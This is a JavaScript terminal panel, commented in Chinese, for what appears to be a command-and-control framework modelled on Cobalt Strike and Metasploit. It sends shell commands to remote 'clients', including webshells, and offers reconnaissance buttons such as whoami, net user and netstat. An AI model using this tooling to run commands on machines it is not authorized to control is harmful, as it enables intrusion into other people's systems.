// app-terminal.js - 命令终端（参考 CS Beacon Console / MSF meterpreter 交互）
// 特性：
// - 提示符与输入框同一行（不强制换行）
// - 上下方向键浏览历史命令
// - 根据目标系统自动切换默认 shell（Windows→cmd, Linux→bash）
// - 输出 HTML 转义，防止命令输出破坏页面
// - 命令执行状态指示（执行中/成功/失败）

app.renderTerminal = function() {
    if (!this.selectedClient) {
        return this.renderClientBar();
    }

    const c = this.selectedClient;
    // 根据目标系统选择默认 shell
    const isWindows = (c.os || '').toLowerCase().includes('win');
    const defaultShell = isWindows ? 'cmd' : 'bash';
    // 历史命令索引（-1 表示不在浏览历史状态）
    this._cmdHistoryIdx = -1;

    // 生成提示符（简洁版，避免主机名过长导致换行）
    const promptUser = (c.username || 'user').split('\\').pop(); // 取反斜杠后的用户名
    const promptHost = (c.hostname || 'host').split('.')[0];     // 去掉域名后缀
    const promptPath = isWindows ? 'C:\\' : '~';
    const promptSymbol = isWindows ? '>' : '$';
    const promptText = `${promptUser}@${promptHost} ${promptPath}${promptSymbol}`;

    return `
        ${this.renderClientBar()}
        <div style="margin-bottom:12px; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
            <select class="select" style="max-width:140px;" id="shellType">
                ${isWindows ? `
                    <option value="cmd" selected>CMD</option>
                    <option value="powershell">PowerShell</option>
                ` : `
                    <option value="bash" selected>Bash</option>
                    <option value="sh">sh</option>
                `}
            </select>
            <button class="btn btn-secondary" onclick="app.clearTerminal()"><i class="fas fa-trash"></i> 清空</button>
            <div style="flex:1;"></div>
            <span class="badge badge-${c.status === 'online' ? 'green' : 'red'}"><span class="status-dot ${c.status}"></span>${c.status === 'online' ? '在线' : '离线'}</span>
            <span style="font-size:11px; color:#6e7681;"><i class="fas fa-info-circle"></i> ↑↓浏览历史 | Enter执行</span>
        </div>
        <div class="terminal" id="terminal" style="height:480px;">
            <div class="terminal-line terminal-output">[*] 已连接到 <span style="color:#58a6ff;">${c.hostname}</span> (session: ${(c.session_id||c.client_id||'').slice(0,8)})</div>
            <div class="terminal-line terminal-output">[*] 系统: ${c.os || '-'} ${c.arch || ''} | IP: ${c.ip || '-'}</div>
            <div class="terminal-line terminal-output">[*] 用户: ${c.username || '-'} | 权限: ${c.permission || 'user'}</div>
            <div class="terminal-line terminal-output">─────────────────────────────────────────────</div>
            <div class="terminal-line terminal-output" style="color:#6e7681;">提示: 输入 help 查看常用命令，输入 exit 断开会话</div>
            ${this.terminalHistory.map(h => this._renderTerminalEntry(h, promptText, promptSymbol)).join('')}
            <div style="display:flex; align-items:center; padding:2px 0;">
                <span style="color:#7ee787; white-space:nowrap; flex-shrink:0;">${promptText}&nbsp;</span>
                <input class="terminal-input" id="terminalInput" placeholder="输入命令后按 Enter 执行..." autocomplete="off" spellcheck="false"
                       onkeydown="app.handleTerminalKeydown(event)">
            </div>
        </div>
        <div style="margin-top:12px; display:flex; gap:8px; flex-wrap:wrap;">
            ${(isWindows
                ? ['whoami', 'ipconfig', 'tasklist', 'systeminfo', 'net user', 'netstat -ano', 'dir', 'query user']
                : ['whoami', 'id', 'ifconfig', 'ps aux', 'uname -a', 'ls -la', 'netstat -tlnp', 'crontab -l']
            ).map(cmd => `
                <button class="btn btn-secondary" style="font-size:11px; padding:4px 10px;" onclick="app.quickCmd('${cmd.replace(/'/g, "\\'")}')">${cmd}</button>
            `).join('')}
        </div>
    `;
};

// 渲染单条历史记录（命令+输出）
app._renderTerminalEntry = function(h, promptText, promptSymbol) {
    const escOutput = this._escapeTermHtml(h.output || '');
    const statusIcon = h.status === 'running' ? '<span style="color:#d29922;">⏳</span> '
                     : h.status === 'error' ? '<span style="color:#f85149;">✗</span> '
                     : '<span style="color:#3fb950;">✓</span> ';
    return `
        <div class="terminal-line" style="display:flex; align-items:flex-start;">
            <span style="color:#7ee787; white-space:nowrap; flex-shrink:0;">${promptText}&nbsp;</span>
            <span style="color:#e0e6ed; word-break:break-all; white-space:pre-wrap;">${this._escapeTermHtml(h.cmd)}</span>
        </div>
        <div class="terminal-line terminal-output" style="white-space:pre-wrap; word-break:break-all; padding-left:0;">${statusIcon}${escOutput}</div>
    `;
};

// HTML 转义（终端输出专用，保留空格和换行）
app._escapeTermHtml = function(text) {
    if (!text) return '';
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
};

// 终端按键处理：Enter执行、上下浏览历史
app.handleTerminalKeydown = function(event) {
    if (event.key === 'Enter') {
        this.execCommand();
    } else if (event.key === 'ArrowUp') {
        event.preventDefault();
        this._navigateCmdHistory(-1);
    } else if (event.key === 'ArrowDown') {
        event.preventDefault();
        this._navigateCmdHistory(1);
    }
};

// 浏览历史命令
app._navigateCmdHistory = function(dir) {
    const completedCmds = this.terminalHistory.filter(h => h.cmd).map(h => h.cmd);
    if (completedCmds.length === 0) return;
    if (dir === -1) {
        // 向上（更早的命令）
        if (this._cmdHistoryIdx === -1) {
            this._cmdHistoryIdx = completedCmds.length - 1;
        } else if (this._cmdHistoryIdx > 0) {
            this._cmdHistoryIdx--;
        }
    } else {
        // 向下（更新的命令）
        if (this._cmdHistoryIdx === -1) return;
        if (this._cmdHistoryIdx < completedCmds.length - 1) {
            this._cmdHistoryIdx++;
        } else {
            // 到达最新，清空输入框
            this._cmdHistoryIdx = -1;
            const input = document.getElementById('terminalInput');
            if (input) input.value = '';
            return;
        }
    }
    const input = document.getElementById('terminalInput');
    if (input && completedCmds[this._cmdHistoryIdx]) {
        input.value = completedCmds[this._cmdHistoryIdx];
        // 将光标移到末尾
        setTimeout(() => { input.setSelectionRange(input.value.length, input.value.length); }, 0);
    }
};

app.execCommand = async function() {
    const input = document.getElementById('terminalInput');
    if (!input) return;
    const cmd = input.value.trim();
    if (!cmd) return;
    input.value = '';
    this._cmdHistoryIdx = -1;

    // help 命令：本地显示帮助信息
    if (cmd.toLowerCase() === 'help') {
        this.terminalHistory.push({
            cmd: cmd,
            output: '常用命令:\n  whoami          显示当前用户\n  ipconfig/ifconfig  查看网络配置\n  tasklist/ps aux 查看进程\n  systeminfo/uname -a  系统信息\n  net user        查看用户列表(Windows)\n  netstat -ano    查看网络连接\n  dir / ls -la    列目录\n  exit            断开会话\n\n提示: 使用↑↓方向键浏览历史命令',
            status: 'success'
        });
        this._scrollTerminalBottom();
        this.render();
        return;
    }

    // exit 命令
    if (cmd.toLowerCase() === 'exit' || cmd.toLowerCase() === 'quit') {
        this.terminalHistory.push({
            cmd: cmd,
            output: '[*] 会话已断开',
            status: 'success'
        });
        this.render();
        return;
    }

    const idx = this.terminalHistory.length;
    this.terminalHistory.push({ cmd, output: '执行中...', status: 'running' });
    this.render();

    const shell = document.getElementById('shellType')?.value || 'cmd';
    // 使用 task_id 精确轮询，避免结果串台（参考 app-files.js _waitForFileTask）
    const taskIds = await this.sendTask('cmd', { command: cmd, shell });
    const taskId = taskIds && taskIds.length > 0 ? taskIds[0] : null;

    if (!taskId) {
        if (this.terminalHistory[idx]) {
            this.terminalHistory[idx].output = '[错误] 任务下发失败';
            this.terminalHistory[idx].status = 'error';
            this.render();
            this._scrollTerminalBottom();
        }
        return;
    }

    // 按 task_id 精确轮询任务结果
    let attempts = 0;
    const maxAttempts = 30;
    // WebShell / Shell 同步模式：sendTask 返回时 task 已是 completed，立即检查
    const isWebshell = this.selectedClient && this.selectedClient.client_type === 'webshell';
    const isShell = this.selectedClient && this.selectedClient.client_type === 'shell';
    const checkDelay = (isWebshell || isShell) ? 100 : 1200;
    const check = () => {
        attempts++;
        this.loadTasksSilent().then(() => {
            // 精确匹配 task_id，不再用 client_id + task_type 模糊匹配
            const task = this.tasks.find(t => t.id === taskId);
            if (task && (task.status === 'completed' || task.status === 'failed')) {
                if (this.terminalHistory[idx]) {
                    // WebShell 响应信封拆包: 服务端可能残留 {"result":"...","status":"completed"} 格式
                    let out = task.result || '[空输出]';
                    if (this.selectedClient && this.selectedClient.client_type === 'webshell') {
                        out = this._unwrapWebshellResult(out);
                    }
                    this.terminalHistory[idx].output = out;
                    this.terminalHistory[idx].status = task.status === 'failed' ? 'error' : 'success';
                    this.render();
                    this._scrollTerminalBottom();
                }
            } else if (attempts < maxAttempts) {
                setTimeout(check, 1000);
            } else {
                if (this.terminalHistory[idx]) {
                    this.terminalHistory[idx].output = '[超时] 命令执行未返回结果，请确认主机在线';
                    this.terminalHistory[idx].status = 'error';
                    this.render();
                    this._scrollTerminalBottom();
                }
            }
        });
    };
    setTimeout(check, checkDelay);
};

// 滚动到终端底部
app._scrollTerminalBottom = function() {
    setTimeout(() => {
        const term = document.getElementById('terminal');
        if (term) term.scrollTop = term.scrollHeight;
    }, 50);
};

app.quickCmd = function(cmd) {
    const input = document.getElementById('terminalInput');
    if (input) {
        input.value = cmd;
        input.focus();
    }
};

app.clearTerminal = function() {
    this.terminalHistory = [];
    this._cmdHistoryIdx = -1;
    this.render();
};
